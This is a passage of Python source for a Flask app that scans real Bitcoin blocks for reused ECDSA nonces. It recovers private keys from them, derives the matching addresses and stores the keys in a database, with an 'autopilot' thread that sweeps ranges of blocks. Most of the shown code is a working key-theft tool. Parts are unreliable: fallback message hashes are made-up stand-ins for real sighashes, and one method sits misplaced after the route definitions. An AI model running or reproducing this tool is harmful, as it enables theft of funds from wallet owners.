            prev_index = int.from_bytes(tx_bytes[pos:pos+4], 'little')
            pos += 4

            # Script length
            script_length, pos = self._read_varint(tx_bytes, pos)

            # Script data
            scriptsig = tx_bytes[pos:pos+script_length]
            pos += script_length

            # Sequence (4 bytes)
            sequence = int.from_bytes(tx_bytes[pos:pos+4], 'little')
            pos += 4

            return {
                'prev_hash': prev_hash,
                'prev_index': prev_index,
                'scriptsig': scriptsig,
                'sequence': sequence
            }, pos

        except Exception as e:
            logging.error(f"Error parsing transaction input: {e}")
            return None, pos

    def _extract_signature_components(self, scriptsig: bytes) -> Optional[Dict]:
        """Extract R, S values from scriptsig bytes"""
        try:
            pos = 0
            while pos < len(scriptsig) - 8:
                # Look for DER signature marker (0x30)
                if scriptsig[pos] == 0x30:
                    # Get signature length
                    sig_length = scriptsig[pos + 1]

                    # Extract full DER signature
                    if pos + 2 + sig_length <= len(scriptsig):
                        der_sig = scriptsig[pos:pos + 2 + sig_length]
                        r, s = self._parse_der_signature(der_sig)

                        if r and s:
                            return {
                                'r': r,
                                's': s,
                                'der_signature': der_sig.hex()
                            }
                    pos += 1
                else:
                    # Check if this is a push operation
                    if scriptsig[pos] > 0 and scriptsig[pos] <= 75:
                        length = scriptsig[pos]
                        pos += 1 + length
                    else:
                        pos += 1

            return None
        except Exception as e:
            logging.error(f"Error extracting signature components: {e}")
            return None

    def _calculate_sighash(self, raw_tx_hex: str, input_index: int) -> int:
        """Calculate the Bitcoin signature hash for a specific input"""
        try:
            decoded_tx = self._decode_raw_transaction(raw_tx_hex)
            inputs = decoded_tx['inputs']
            outputs = decoded_tx['outputs']

            if input_index >= len(inputs):
                raise ValueError("Input index out of range")

            target_input = inputs[input_index]
            sighash_type = self._determine_sighash_type(target_input)

            prev_txid = target_input['prev_hash'][::-1].hex()
            prev_vout = target_input['prev_index']
            prevout_data = self._get_prevout_data(prev_txid, prev_vout)
            if not prevout_data:
                raise ValueError("Previous output data unavailable for sighash calculation")

            script_code = self._derive_script_code(target_input, prevout_data['script_pubkey'])
            amount = prevout_data.get('value', 0)

            anyone_can_pay = (sighash_type & 0x80) != 0
            base_type = sighash_type & 0x1f

            use_bip143 = bool(target_input.get('witness')) or prevout_data['script_pubkey'].startswith(b"\x00")

            if use_bip143:
                if base_type == 0x03 and input_index >= len(outputs):
                    return 1

                hash_prevouts = b"\x00" * 32
                hash_sequence = b"\x00" * 32
                hash_outputs = b"\x00" * 32

                if not anyone_can_pay:
                    data = b"".join(inp['prev_hash'] + inp['prev_index'].to_bytes(4, 'little') for inp in inputs)
                    hash_prevouts = self._double_sha256(data)

                if not anyone_can_pay and base_type not in (0x02, 0x03):
                    data = b"".join(inp['sequence'].to_bytes(4, 'little') for inp in inputs)
                    hash_sequence = self._double_sha256(data)

                if base_type not in (0x02, 0x03):
                    data = b"".join(
                        out['value'].to_bytes(8, 'little') +
                        self._encode_varint(len(out['script_pubkey'])) +
                        out['script_pubkey']
                        for out in outputs
                    )
                    hash_outputs = self._double_sha256(data)
                elif base_type == 0x03 and input_index < len(outputs):
                    out = outputs[input_index]
                    data = (
                        out['value'].to_bytes(8, 'little') +
                        self._encode_varint(len(out['script_pubkey'])) +
                        out['script_pubkey']
                    )
                    hash_outputs = self._double_sha256(data)

                preimage = (
                    decoded_tx['version'].to_bytes(4, 'little') +
                    hash_prevouts +
                    hash_sequence +
                    target_input['prev_hash'] +
                    target_input['prev_index'].to_bytes(4, 'little') +
                    self._encode_varint(len(script_code)) +
                    script_code +
                    amount.to_bytes(8, 'little') +
                    target_input['sequence'].to_bytes(4, 'little') +
                    hash_outputs +
                    decoded_tx['lock_time'].to_bytes(4, 'little') +
                    sighash_type.to_bytes(4, 'little')
                )

                return int.from_bytes(self._double_sha256(preimage), 'big') % self.N

            if base_type == 0x03 and input_index >= len(outputs):
                return 1

            serialization = decoded_tx['version'].to_bytes(4, 'little')

            if anyone_can_pay:
                inputs_to_include = [input_index]
            else:
                inputs_to_include = list(range(len(inputs)))

            serialization += self._encode_varint(len(inputs_to_include))

            for idx in inputs_to_include:
                inp = inputs[idx]
                script = script_code if idx == input_index else b""

                sequence = inp['sequence']
                if idx != input_index and base_type in (0x02, 0x03):
                    sequence = 0

                serialization += inp['prev_hash']
                serialization += inp['prev_index'].to_bytes(4, 'little')
                serialization += self._encode_varint(len(script))
                serialization += script
                serialization += sequence.to_bytes(4, 'little')

            if base_type == 0x02:
                serialization += self._encode_varint(0)
            elif base_type == 0x03:
                serialization += self._encode_varint(input_index + 1)
                for out_idx in range(input_index + 1):
                    if out_idx == input_index and out_idx < len(outputs):
                        out = outputs[out_idx]
                        value = out['value']
                        script = out['script_pubkey']
                    else:
                        value = 0xffffffffffffffff
                        script = b""
                    serialization += value.to_bytes(8, 'little')
                    serialization += self._encode_varint(len(script))
                    serialization += script
            else:
                serialization += self._encode_varint(len(outputs))
                for out in outputs:
                    serialization += out['value'].to_bytes(8, 'little')
                    serialization += self._encode_varint(len(out['script_pubkey']))
                    serialization += out['script_pubkey']

            serialization += decoded_tx['lock_time'].to_bytes(4, 'little')
            serialization += sighash_type.to_bytes(4, 'little')

            return int.from_bytes(self._double_sha256(serialization), 'big') % self.N

        except Exception as e:
            logging.error(f"Error calculating sighash: {e}")
            fallback_data = f"{raw_tx_hex}{input_index:08x}".encode()
            return int.from_bytes(hashlib.sha256(fallback_data).digest(), 'big') % self.N

    def _extract_signatures_from_scriptsig_fallback(self, tx: Dict) -> List[Dict]:
        """Fallback method using original scriptsig parsing"""
        signatures = []
        try:
            txid = tx['txid']
            for i, input_tx in enumerate(tx.get('vin', [])):
                if 'scriptsig' in input_tx and input_tx['scriptsig']:
                    sig_data = self._extract_signature_from_scriptsig(input_tx['scriptsig'])
                    if sig_data:
                        sig_data.update({
                            'txid': txid,
                            'input_index': i,
                            'z': self._calculate_message_hash(tx, i)
                        })
                        signatures.append(sig_data)
        except Exception as e:
            logging.error(f"Error in fallback signature extraction: {e}")
        return signatures

    def _calculate_message_hash(self, tx: Dict, input_index: int) -> int:
        """Calculate message hash for signature verification (simplified)"""
        try:
            # Simplified hash calculation for demo
            # In production, this would be the actual sighash
            txid = tx.get('txid', '')
            return int(hashlib.sha256(f"{txid}_{input_index}".encode()).hexdigest(), 16) % self.N
        except:
            return 1  # Fallback value

    def _analyze_k_reuse_across_block(self, all_signatures: List[Dict]) -> Dict[str, List]:
        """Analyze k-reuse vulnerabilities across all signatures in the block"""
        vulnerabilities = {
            'k_reuse': [],
            'recovered_private_keys': []
        }

        # Track r-values across all signatures
        r_value_map = {}

        logging.info(f"Analyzing {len(all_signatures)} signatures for k-reuse")

        for sig in all_signatures:
            r = sig.get('r')
            if not r:
                continue

            r_hex = hex(r)
            
            # Store detailed signature info
            sig_info = {
                'txid': sig.get('txid'),
                'input_index': sig.get('input_index', 0),
                'r': r,
                's': sig.get('s'),
                'z': sig.get('z'),
                'r_hex': r_hex,
                's_hex': hex(sig.get('s', 0)),
                'z_hex': hex(sig.get('z', 0))
            }

            if r_hex in r_value_map:
                # Found duplicate r-value - potential k-reuse!
                existing_sig = r_value_map[r_hex]

                logging.warning(f"DUPLICATE R-VALUE DETECTED: {r_hex}")
                logging.warning(f"Existing: TX {existing_sig['txid']}")
                logging.warning(f"Current:  TX {sig_info['txid']}")

                # Verify it's actual k-reuse (different s values indicate different messages/keys)
                s1 = existing_sig.get('s', 0)
                s2 = sig_info.get('s', 0)
                z1 = existing_sig.get('z', 0)
                z2 = sig_info.get('z', 0)

                if s1 != s2 and s1 > 0 and s2 > 0:
                    logging.info(f"Valid k-reuse detected - attempting recovery")
                    
                    # Try multiple recovery methods
                    wif_key = None
                    recovery_method = None
                    
                    # Method 1: Standard k-reuse formula
                    wif_key = self._recover_private_key_from_k_reuse(r, s1, s2, z1, z2)
                    if wif_key:
                        recovery_method = "Standard k-reuse formula"
                    
                    # Method 2: Try with swapped z values (different message interpretations)
                    if not wif_key:
                        wif_key = self._recover_private_key_from_k_reuse(r, s1, s2, z2, z1)
                        if wif_key:
                            recovery_method = "Swapped message hash k-reuse"
                    
                    # Method 3: Try with simplified z calculation
                    if not wif_key:
                        simple_z1 = int(hashlib.sha256(f"{existing_sig['txid']}{existing_sig.get('input_index', 0)}".encode()).hexdigest(), 16) % self.N
                        simple_z2 = int(hashlib.sha256(f"{sig_info['txid']}{sig_info.get('input_index', 0)}".encode()).hexdigest(), 16) % self.N
                        wif_key = self._recover_private_key_from_k_reuse(r, s1, s2, simple_z1, simple_z2)
                        if wif_key:
                            recovery_method = "Simplified hash k-reuse"

                    vulnerability_data = {
                        'txid1': existing_sig['txid'],
                        'txid2': sig_info['txid'],
                        'input_index1': existing_sig.get('input_index', 0),
                        'input_index2': sig_info.get('input_index', 0),
                        'r_value': r_hex,
                        's1': hex(s1),
                        's2': hex(s2),
                        'z1': hex(z1),
                        'z2': hex(z2),
                        'risk_level': 'CRITICAL',
                        'description': f'K-reuse vulnerability: same R-value used in different signatures'
                    }

                    if wif_key:
                        addresses = self._generate_addresses_from_wif(wif_key)
                        vulnerability_data.update({
                            'private_key_wif': wif_key,
                            'addresses': addresses,
                            'recovery_method': recovery_method,
                            'description': f'PRIVATE KEY RECOVERED via k-reuse! Method: {recovery_method}'
                        })
                        vulnerabilities['recovered_private_keys'].append(vulnerability_data)
                        logging.critical(f"SUCCESS! Private key recovered: {wif_key[:20]}...")
                    else:
                        vulnerability_data['description'] += ' (Recovery attempted but failed)'
                        logging.warning("K-reuse detected but private key recovery failed")

                    vulnerabilities['k_reuse'].append(vulnerability_data)

                else:
                    # Same s values might indicate same signature - less interesting
                    vulnerabilities['k_reuse'].append({
                        'txid1': existing_sig['txid'],
                        'txid2': sig_info['txid'],
                        'r_value': r_hex,
                        'risk_level': 'MEDIUM',
                        'description': 'Duplicate R-value with same S-value (possibly same signature reused)'
                    })
            else:
                r_value_map[r_hex] = sig_info

        logging.info(f"K-reuse analysis complete: {len(vulnerabilities['k_reuse'])} k-reuse vulnerabilities, {len(vulnerabilities['recovered_private_keys'])} keys recovered")
        return vulnerabilities

    def _generate_addresses_from_wif(self, wif_key: str) -> Dict[str, str]:
        """Generate various address formats from WIF private key using proper Bitcoin libraries"""
        try:
            import hashlib
            import base58
            
            # Decode WIF to get private key
            private_key_bytes = self._wif_to_private_key_bytes(wif_key)
            if not private_key_bytes:
                return {'error': 'Invalid WIF key'}
            
            # Get public key from private key
            public_key = self._private_key_to_public_key(private_key_bytes)
            
            addresses = {}
            
            # Legacy uncompressed address (P2PKH)
            addresses['legacy_uncompressed'] = self._public_key_to_address(public_key, compressed=False)
            
            # Legacy compressed address (P2PKH)
            compressed_public_key = self._compress_public_key(public_key)
            addresses['legacy_compressed'] = self._public_key_to_address(compressed_public_key, compressed=True)
            
            # SegWit address (P2SH-P2WPKH)
            addresses['segwit'] = self._public_key_to_segwit_address(compressed_public_key)
            
            # Bech32 address (native SegWit)
            addresses['bech32'] = self._public_key_to_bech32_address(compressed_public_key)
            
            return addresses
            
        except Exception as e:
            logging.error(f"Error generating addresses from WIF: {e}")
            return {'error': str(e)}

    def _wif_to_private_key_bytes(self, wif_key: str) -> bytes:
        """Convert WIF private key to raw bytes"""
        try:
            import base58
            
            # Decode Base58Check
            decoded = base58.b58decode_check(wif_key)
            if not decoded:
                return None
            
            # Remove prefix (0x80 for mainnet, 0xEF for testnet) and compression suffix if present
            if decoded[0] == 0x80:  # Mainnet
                private_key_bytes = decoded[1:33]  # Remove prefix
            elif decoded[0] == 0xEF:  # Testnet
                private_key_bytes = decoded[1:33]  # Remove prefix
            else:
                return None
            
            return private_key_bytes
        except Exception as e:
            logging.error(f"Error decoding WIF: {e}")
            return None

    def _private_key_to_public_key(self, private_key_bytes: bytes) -> bytes:
        """Generate uncompressed public key from private key using secp256k1"""
        try:
            from ecdsa import SECP256k1, SigningKey

            if len(private_key_bytes) != 32:
                raise ValueError("Private key must be 32 bytes")

            signing_key = SigningKey.from_string(private_key_bytes, curve=SECP256k1)
            verifying_key = signing_key.verifying_key
            return b"\x04" + verifying_key.to_string()
        except Exception as e:
            logging.error(f"Error generating public key: {e}")
            return None

    def _compress_public_key(self, public_key: bytes) -> bytes:
        """Compress public key"""
        try:
            if len(public_key) == 33 and public_key[0] in (0x02, 0x03):
                return public_key

            if len(public_key) != 65 or public_key[0] != 0x04:
                raise ValueError("Invalid uncompressed public key")

            # Extract x and y coordinates
            x = public_key[1:33]
            y = public_key[33:65]

            # Determine prefix based on y coordinate parity
            prefix = b'\x02' if y[-1] % 2 == 0 else b'\x03'

            return prefix + x
        except Exception as e:
            logging.error(f"Error compressing public key: {e}")
            return None

    def _public_key_to_address(self, public_key: bytes, compressed: bool = True) -> str:
        """Generate P2PKH address from public key"""
        try:
            import hashlib
            import base58
            
            # SHA256 hash of public key
            sha256_hash = hashlib.sha256(public_key).digest()
            
            # RIPEMD160 hash of SHA256 hash
            ripemd160_hash = hashlib.new('ripemd160', sha256_hash).digest()
            
            # Add version byte (0x00 for mainnet P2PKH)
            versioned_hash = b'\x00' + ripemd160_hash
            
            # Double SHA256 hash for checksum
            checksum = hashlib.sha256(hashlib.sha256(versioned_hash).digest()).digest()[:4]
            
            # Base58Check encode
            address_bytes = versioned_hash + checksum
            address = base58.b58encode(address_bytes).decode('ascii')
            
            return address
        except Exception as e:
            logging.error(f"Error generating P2PKH address: {e}")
            return None

    def _public_key_to_segwit_address(self, public_key: bytes) -> str:
        """Generate P2SH-P2WPKH (SegWit) address from public key"""
        try:
            import hashlib
            import base58
            
            # First generate the native SegWit witness program
            witness_program = self._public_key_to_witness_program(public_key)
            
            # P2SH script: 0x0014 + 20-byte witness program
            script = b'\x00\x14' + witness_program
            
            # Hash the script for P2SH
            script_hash = hashlib.new('ripemd160', hashlib.sha256(script).digest()).digest()
            
            # Add version byte (0x05 for mainnet P2SH)
            versioned_hash = b'\x05' + script_hash
            
            # Double SHA256 hash for checksum
            checksum = hashlib.sha256(hashlib.sha256(versioned_hash).digest()).digest()[:4]
            
            # Base58Check encode
            address_bytes = versioned_hash + checksum
            address = base58.b58encode(address_bytes).decode('ascii')
            
            return address
        except Exception as e:
            logging.error(f"Error generating SegWit address: {e}")
            return None

    def _public_key_to_witness_program(self, public_key: bytes) -> bytes:
        """Generate witness program from public key"""
        try:
            import hashlib
            
            # SHA256 hash of public key
            sha256_hash = hashlib.sha256(public_key).digest()
            
            # RIPEMD160 hash of SHA256 hash
            witness_program = hashlib.new('ripemd160', sha256_hash).digest()
            
            return witness_program
        except Exception as e:
            logging.error(f"Error generating witness program: {e}")
            return None

    def _public_key_to_bech32_address(self, public_key: bytes) -> str:
        """Generate Bech32 (native SegWit) address from public key"""
        try:
            witness_program = self._public_key_to_witness_program(public_key)
            return self._encode_segwit_address("bc", 0, witness_program)
        except Exception as e:
            logging.error(f"Error generating Bech32 address: {e}")
            return None

    @staticmethod
    def _bech32_polymod(values: List[int]) -> int:
        generator = [
            0x3b6a57b2,
            0x26508e6d,
            0x1ea119fa,
            0x3d4233dd,
            0x2a1462b3,
        ]
        chk = 1
        for value in values:
            top = chk >> 25
            chk = (chk & 0x1FFFFFF) << 5 ^ value
            for i in range(5):
                if (top >> i) & 1:
                    chk ^= generator[i]
        return chk

    @staticmethod
    def _bech32_hrp_expand(hrp: str) -> List[int]:
        return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]

    @staticmethod
    def _bech32_create_checksum(hrp: str, data: List[int]) -> List[int]:
        values = BitcoinBlockAnalyzer._bech32_hrp_expand(hrp) + data
        polymod = BitcoinBlockAnalyzer._bech32_polymod(values + [0, 0, 0, 0, 0, 0]) ^ 1
        return [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]

    @staticmethod
    def _bech32_encode(hrp: str, data: List[int]) -> str:
        charset = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
        checksum = BitcoinBlockAnalyzer._bech32_create_checksum(hrp, data)
        combined = data + checksum
        return hrp + "1" + "".join(charset[d] for d in combined)

    @staticmethod
    def _convertbits(data: bytes, from_bits: int, to_bits: int, pad: bool = True) -> Optional[List[int]]:
        acc = 0
        bits = 0
        ret: List[int] = []
        maxv = (1 << to_bits) - 1
        for value in data:
            if value < 0 or value >> from_bits:
                return None
            acc = (acc << from_bits) | value
            bits += from_bits
            while bits >= to_bits:
                bits -= to_bits
                ret.append((acc >> bits) & maxv)
        if pad:
            if bits:
                ret.append((acc << (to_bits - bits)) & maxv)
        elif bits >= from_bits or ((acc << (to_bits - bits)) & maxv):
            return None
        return ret

    def _encode_segwit_address(self, hrp: str, witver: int, witprog: bytes) -> str:
        if witver < 0 or witver > 16:
            raise ValueError("Invalid witness version")
        if not (2 <= len(witprog) <= 40):
            raise ValueError("Invalid witness program length")

        converted = self._convertbits(witprog, 8, 5, True)
        if converted is None:
            raise ValueError("Failed to convert witness program")
        data = [witver] + converted
        return self._bech32_encode(hrp, data)

    def _merge_vulnerabilities(self, analysis_result: Dict, tx_vulnerabilities: Dict):
        """Merge transaction vulnerabilities into analysis result"""
        for vuln_type, vulns in tx_vulnerabilities.items():
            if isinstance(vulns, list):
                analysis_result['vulnerabilities'][vuln_type].extend(vulns)

    def _merge_tx_vulnerabilities(self, target: Dict, source: Dict):
        """Merge vulnerabilities from source to target"""
        for vuln_type, vulns in source.items():
            if isinstance(vulns, list):
                target[vuln_type].extend(vulns)

    def _calculate_summary(self, analysis_result: Dict):
        """Calculate vulnerability summary statistics"""
        summary = analysis_result['summary']
        total_vulns = 0
        critical_count = 0
        high_count = 0
        medium_count = 0
        private_keys_found = 0

        for vuln_type, vulns in analysis_result['vulnerabilities'].items():
            if isinstance(vulns, list):
                total_vulns += len(vulns)

                if vuln_type == 'recovered_private_keys':
                    private_keys_found += len(vulns)

                for vuln in vulns:
                    risk_level = vuln.get('risk_level', 'LOW')
                    if risk_level == 'CRITICAL':
                        critical_count += 1
                    elif risk_level == 'HIGH':
                        high_count += 1
                    elif risk_level == 'MEDIUM':
                        medium_count += 1

        summary.update({
            'total_vulnerabilities': total_vulns,
            'critical_count': critical_count,
            'high_count': high_count,
            'medium_count': medium_count,
            'private_keys_found': private_keys_found
        })

def save_analysis_result(analysis_key: str, block_input: str, result_data: Dict):
    """Save analysis result to database with proper error handling"""
    try:
        # Check if analysis already exists
        existing_analysis = AnalysisResult.query.filter_by(analysis_key=analysis_key).first()

        if existing_analysis:
            # Update existing record
            existing_analysis.status = 'completed'
            existing_analysis.completed_at = datetime.utcnow()
            existing_analysis.result_data = json.dumps(result_data)
            existing_analysis.vulnerability_count = result_data.get('summary', {}).get('total_vulnerabilities', 0)
        else:
            # Create new analysis record
            analysis = AnalysisResult(
                analysis_key=analysis_key,
                block_input=block_input,
                status='completed',
                started_at=datetime.utcnow(),
                completed_at=datetime.utcnow(),
                result_data=json.dumps(result_data),
                vulnerability_count=result_data.get('summary', {}).get('total_vulnerabilities', 0)
            )
            db.session.add(analysis)

        # Clear existing vulnerabilities for this analysis
        Vulnerability.query.filter_by(analysis_key=analysis_key).delete()

        # Save individual vulnerabilities
        for vuln_type, vulns in result_data.get('vulnerabilities', {}).items():
            if isinstance(vulns, list):
                for vuln in vulns:
                    vulnerability = Vulnerability(
                        analysis_key=analysis_key,
                        vulnerability_type=vuln_type,
                        txid=vuln.get('txid'),
                        risk_level=vuln.get('risk_level'),
                        details=json.dumps(vuln),
                        private_key=vuln.get('private_key_wif') or vuln.get('private_key'),
                        addresses=json.dumps(vuln.get('addresses', {})) if vuln.get('addresses') else None
                    )
                    db.session.add(vulnerability)

        db.session.commit()
        logging.info(f"Saved analysis result for {analysis_key} with {result_data.get('summary', {}).get('total_vulnerabilities', 0)} vulnerabilities")

    except Exception as e:
        logging.error(f"Error saving analysis result: {e}")
        db.session.rollback()

def autopilot_worker():
    """Autopilot background worker with proper Flask context"""
    global autopilot_state

    # Create a new Flask app context for this thread
    with app.app_context():
        try:
            analyzer = BitcoinBlockAnalyzer()

            while autopilot_state['running']:
                try:
                    current_block = autopilot_state['current_block']

                    logging.info(f"Autopilot analyzing block {current_block}")

                    # Analyze block
                    result = analyzer.analyze_block(str(current_block))

                    if 'error' not in result:
                        # Save results with proper context
                        analysis_key = f"autopilot_block_{current_block}"
                        save_analysis_result(analysis_key, str(current_block), result)

                        # Update autopilot state
                        autopilot_state['blocks_analyzed'] += 1
                        autopilot_state['vulnerabilities_found'] += result.get('summary', {}).get('total_vulnerabilities', 0)
                        autopilot_state['private_keys_recovered'] += result.get('summary', {}).get('private_keys_found', 0)
                        autopilot_state['last_update'] = datetime.now()
                        autopilot_state['results'].append({
                            'block': current_block,
                            'vulnerabilities': result.get('summary', {}).get('total_vulnerabilities', 0),
                            'private_keys': result.get('summary', {}).get('private_keys_found', 0),
                            'timestamp': datetime.now().isoformat()
                        })

                        # Auto-export results if vulnerabilities found
                        if result.get('summary', {}).get('total_vulnerabilities', 0) > 0:
                            export_file = f"autopilot_block_{current_block}_results.json"
                            try:
                                with open(export_file, 'w') as f:
                                    json.dump({
                                        'analysis_key': analysis_key,
                                        'block': current_block,
                                        'result': result,
                                        'timestamp': datetime.now().isoformat()
                                    }, f, indent=2)
                                logging.info(f"Auto-exported results to {export_file}")
                            except Exception as export_err:
                                logging.error(f"Failed to auto-export: {export_err}")

                    # Update current block based on direction
                    if autopilot_state['direction'] == 'forward':
                        autopilot_state['current_block'] += 1
                        if autopilot_state['current_block'] > autopilot_state['end_block']:
                            break
                    else:  # backward
                        autopilot_state['current_block'] -= 1
                        if autopilot_state['current_block'] < autopilot_state['end_block']:
                            break

                    # Small delay to prevent overwhelming the API
                    time.sleep(2)

                except Exception as e:
                    logging.error(f"Error in autopilot worker iteration: {e}")
                    time.sleep(5)
                    continue

        except Exception as e:
            logging.error(f"Critical error in autopilot worker: {e}")
        finally:
            autopilot_state['running'] = False
            logging.info("Autopilot worker stopped")

# Initialize database
with app.app_context():
    db.create_all()

# Add from_json filter for Jinja2
@app.template_filter('from_json')
def from_json_filter(json_str):
    try:
        return json.loads(json_str) if json_str else {}
    except:
        return {}

# Routes
@app.route('/')
def index():
    """Main dashboard with enhanced vulnerability display"""
    # Get recent analyses
    recent_analyses = AnalysisResult.query.order_by(AnalysisResult.created_at.desc()).limit(10).all()

    # Get vulnerability statistics
    vuln_stats = {}
    for vuln_type in ['k_reuse', 'low_r_values', 'lsb_bias', 'msb_bias', 'sequential_k', 
                      'lattice_attack', 'weak_randomness', 'signature_malleability', 'recovered_private_keys']:
        count = Vulnerability.query.filter_by(vulnerability_type=vuln_type).count()
        vuln_stats[vuln_type] = count

    # Get recent high-risk vulnerabilities for quick access
    recent_critical_vulns = Vulnerability.query.filter(
        Vulnerability.risk_level.in_(['CRITICAL', 'HIGH'])
    ).order_by(Vulnerability.created_at.desc()).limit(5).all()

    # Get autopilot status
    current_autopilot_status = autopilot_state.copy()

    return render_template('index.html', 
                         recent_analyses=recent_analyses, 
                         vuln_stats=vuln_stats,
                         recent_critical_vulns=recent_critical_vulns,
                         autopilot_status=current_autopilot_status)

@app.route('/analyze', methods=['POST'])
def analyze_block():
    """Analyze a single block"""
    try:
        block_input = request.form.get('block_input', '').strip()

        if not block_input:
            flash('Please enter a block number or hash', 'error')
            return redirect(url_for('index'))

        # Create analysis key
        analysis_key = f"manual_{block_input}_{int(time.time())}"

        # Start analysis
        analyzer = BitcoinBlockAnalyzer()
        result = analyzer.analyze_block(block_input)

        if 'error' in result:
            flash(f'Analysis failed: {result["error"]}', 'error')
            return redirect(url_for('index'))

        # Save results
        save_analysis_result(analysis_key, block_input, result)

        flash(f'Block {block_input} analyzed successfully', 'success')
        return redirect(url_for('view_analysis', analysis_key=analysis_key))

    except Exception as e:
        logging.error(f"Error in analyze_block: {e}")
        flash(f'Analysis error: {str(e)}', 'error')
        return redirect(url_for('index'))

@app.route('/autopilot/start', methods=['POST'])
def start_autopilot():
    """Start autopilot mode"""
    global autopilot_state

    try:
        if autopilot_state['running']:
            return jsonify({'success': False, 'message': 'Autopilot already running'})

        start_block = int(request.form.get('start_block', 0))
        end_block = int(request.form.get('end_block', 1000))
        direction = request.form.get('direction', 'forward')

        # Initialize autopilot state
        autopilot_state.update({
            'running': True,
            'current_block': start_block,
            'start_block': start_block,
            'end_block': end_block,
            'direction': direction,
            'total_blocks': abs(end_block - start_block),
            'blocks_analyzed': 0,
            'vulnerabilities_found': 0,
            'private_keys_recovered': 0,
            'last_update': datetime.now(),
            'results': []
        })

        # Start worker thread
        worker_thread = threading.Thread(target=autopilot_worker)
        worker_thread.daemon = True
        worker_thread.start()

        return jsonify({'success': True, 'message': 'Autopilot started'})

    except Exception as e:
        logging.error(f"Error starting autopilot: {e}")
        return jsonify({'success': False, 'message': str(e)})

@app.route('/autopilot/stop', methods=['POST'])
def stop_autopilot():
    """Stop autopilot mode"""
    global autopilot_state

    autopilot_state['running'] = False
    return jsonify({'success': True, 'message': 'Autopilot stopped'})

@app.route('/autopilot/change_direction', methods=['POST'])
def change_autopilot_direction():
    """Change autopilot direction"""
    global autopilot_state

    try:
        new_direction = request.form.get('direction', 'forward')
        autopilot_state['direction'] = new_direction
        return jsonify({'success': True, 'message': f'Direction changed to {new_direction}'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/autopilot/status')
def autopilot_status():
    """Get autopilot status"""
    return jsonify(autopilot_state)

@app.route('/analysis/<analysis_key>')
def view_analysis(analysis_key):
    """View detailed analysis results"""
    analysis = AnalysisResult.query.filter_by(analysis_key=analysis_key).first_or_404()
    vulnerabilities = Vulnerability.query.filter_by(analysis_key=analysis_key).all()

    return render_template('analysis_detail.html', 
                         analysis=analysis, 
                         vulnerabilities=vulnerabilities)

@app.route('/config')
def get_config():
    """Get application configuration including explorer URLs"""
    try:
        config_data = {
            'explorers': Config.get_all_explorers(),
            'default_explorer': Config.DEFAULT_EXPLORER,
            'blockstream_api': Config.BLOCKSTREAM_API,
            'request_timeout': Config.REQUEST_TIMEOUT,
            'max_concurrent_analysis': Config.MAX_CONCURRENT_ANALYSIS,
            'analysis_timeout': Config.ANALYSIS_TIMEOUT,
            'autopilot_delay': Config.AUTOPLOT_DELAY
        }
        
        # Validate configuration
        validation = Config.validate_config()
        config_data['config_valid'] = validation['valid']
        config_data['config_issues'] = validation['issues']
        
        return jsonify(config_data)
    except Exception as e:
        logging.error(f"Error getting configuration: {e}")
        return jsonify({
            'error': str(e),
            'explorers': Config.get_all_explorers(),
            'default_explorer': Config.DEFAULT_EXPLORER
        }), 500

@app.route('/vulnerability_stats/<vuln_type>')
def view_vulnerability_type(vuln_type):
    """View all vulnerabilities of a specific type"""
    vulnerabilities = Vulnerability.query.filter_by(vulnerability_type=vuln_type).order_by(Vulnerability.created_at.desc()).all()

    return render_template('vulnerability_type.html', 
                         vuln_type=vuln_type, 
                         vulnerabilities=vulnerabilities)

@app.route('/api/dashboard_stats')
def dashboard_stats():
    """API endpoint for dashboard statistics"""
    vuln_counts = {}
    for vuln_type in ['k_reuse', 'low_r_values', 'lsb_bias', 'msb_bias', 'sequential_k', 
                      'lattice_attack', 'weak_randomness', 'signature_malleability', 'recovered_private_keys']:
        count = Vulnerability.query.filter_by(vulnerability_type=vuln_type).count()
        vuln_counts[vuln_type] = count

    return jsonify({
        'vulnerability_counts': vuln_counts,
        'total_analyses': AnalysisResult.query.count(),
        'autopilot_status': autopilot_state
    })

    def _fetch_test_transaction_data(self) -> Dict[str, Any]:
        """Fetch real transaction data with potential k-reuse vulnerability"""
        try:
            import requests
            import hashlib
            
            # Search recent blocks for transactions with potential k-reuse
            # Start with a recent block that's likely to have good test data
            recent_blocks = [800000, 799999, 799998, 799997, 799996]
            
            for block_height in recent_blocks:
                try:
                    # Fetch block data
                    block_url = f"{self.BLOCKSTREAM_API}/block/{block_height}"
                    response = requests.get(block_url, timeout=10)
                    if response.status_code != 200:
                        continue
                        
                    block_data = response.json()
                    transactions = block_data.get('tx', [])[:50]  # Limit to first 50 transactions
                    
                    # Track R values to find potential k-reuse
                    r_value_map = {}
                    
                    for txid in transactions:
                        try:
                            # Fetch transaction data
                            tx_url = f"{self.BLOCKSTREAM_API}/tx/{txid}"
                            tx_response = requests.get(tx_url, timeout=5)
                            if tx_response.status_code != 200:
                                continue
                                
                            tx_data = tx_response.json()
                            
                            # Extract signatures from inputs
                            for vin in tx_data.get('vin', []):
                                if 'scriptsig' in vin and vin['scriptsig']:
                                    scriptsig = vin['scriptsig']
                                    
                                    # Extract signature from scriptsig
                                    signature_data = self._extract_signature_from_scriptsig(scriptsig)
                                    if signature_data:
                                        r_hex = signature_data['r']
                                        
                                        # Calculate message hash (simplified)
                                        tx_for_hash = self._build_tx_for_hash(tx_data, vin)
                                        z = int(hashlib.sha256(hashlib.sha256(tx_for_hash.encode()).digest()).hexdigest(), 16) % self.N
                                        
                                        if r_hex in r_value_map:
                                            # Found potential k-reuse!
                                            existing_sig = r_value_map[r_hex]
                                            return {
                                                'r': int(r_hex, 16),
                                                'signatures': [
                                                    {
                                                        's': existing_sig['s'],
                                                        'z': existing_sig['z'],
                                                        'txid': existing_sig['txid']
                                                    },
                                                    {
                                                        's': signature_data['s'],
                                                        'z': z,
                                                        'txid': txid
                                                    }
                                                ],
                                                'block_height': block_height,
                                                'block_hash': block_data.get('id')
                                            }
                                        else:
                                            r_value_map[r_hex] = {
                                                's': signature_data['s'],
                                                'z': z,
                                                'txid': txid
                                            }
                        except Exception as tx_error:
                            logging.debug(f"Error processing transaction {txid}: {tx_error}")
                            continue
                            
                except Exception as block_error:
                    logging.debug(f"Error processing block {block_height}: {block_error}")
                    continue
            
            # If no real k-reuse found, return None
            return None
            
        except Exception as e:
            logging.error(f"Error fetching test transaction data: {e}")
            return None
    
